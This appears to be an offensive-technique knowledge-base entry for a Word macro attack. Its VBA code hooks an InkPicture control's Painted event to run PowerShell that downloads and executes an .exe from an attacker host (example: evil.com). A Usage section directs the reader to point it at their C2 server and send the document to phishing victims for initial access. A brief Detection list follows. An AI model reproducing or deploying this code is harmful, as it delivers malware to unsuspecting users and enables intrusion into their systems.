---
id: 4dc009aa-0a67-43e4-9e2c-ba7eb4a6beb3
type: code
language: vb
verified: true
created_at: '2023-04-06T03:56:23.729835+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - macro
  - vba
  - activex
  - powershell
  - download-execute
validated: true
---

# VBA-InkPicture-Painted-Event-Download-Execute

## Code

```vb
Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
End Sub
```

## Description

This VBA subroutine attaches to the Painted event of an InkPicture ActiveX control in a Word .docm document. When triggered by user drawing, it spawns cmd.exe to run PowerShell, which downloads a file from a remote URL and executes it, enabling payload delivery without direct macro warnings.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <host> | Remote server hostname or IP hosting the payload | evil.com |
| file.exe | Local filename for the downloaded payload | payload.exe |

## Usage

Embed in the VBA editor of a .docm file after inserting the InkPicture control. Replace <host> with your C2 server. Distribute via email attachment; victim enables macros and draws to trigger. Used in phishing for initial access.

## Detection

- Office macro scanning for Shell calls or PowerShell invocations.
- EDR rules for Word spawning cmd/PowerShell with WebClient downloads.
- Network monitoring for HTTP requests from Office processes to unusual domains.
- AMSI scans for VBA obfuscation or event handlers.

## Related

- [[procedures/ActiveX-Based-Autorun-Macro-with-InkPicture-Control-and-Painted-Event]]
